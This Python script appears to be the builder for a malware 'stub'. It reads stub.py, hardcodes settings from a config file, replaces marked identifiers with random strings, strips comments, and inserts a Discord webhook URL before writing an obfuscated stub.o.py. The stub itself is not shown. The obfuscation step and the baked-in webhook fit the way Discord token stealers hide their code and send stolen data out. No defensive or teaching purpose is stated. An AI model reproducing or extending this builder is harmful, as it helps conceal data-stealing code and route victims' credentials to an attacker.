import re
import os
import json
import random

def GetRandomString(length: int = 5): # Generates a random string
    return "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", k= length))

with open('stub.py') as in_file:

    # Load stub.py
    file_contents = in_file.read()
    
    # Load config.json
    config = dict()
    with open('config.json') as config_file:
        config = json.load(config_file)
    
    # Hardcode settings from config.json
    for setting in config:
        file_contents = re.sub("\""+setting+"\"", str(config[setting]),  file_contents)

    # Obfuscate names
    for name in re.finditer(r"_o_([a-zA-Z]+)", file_contents):
        file_contents = re.sub("_o_" + name.group(1), GetRandomString(), file_contents)

    # Remove comments
    file_contents = re.sub(r"#.*\n", "\n",   file_contents)

    # Hardcode webhook
    file_contents =  file_contents.replace("%webhook%", os.getenv("DISCORD_WEBHOOK"))
    
    # Write to stub.o.py
    with open('stub.o.py', "w") as out_file:
        out_file.write(file_contents)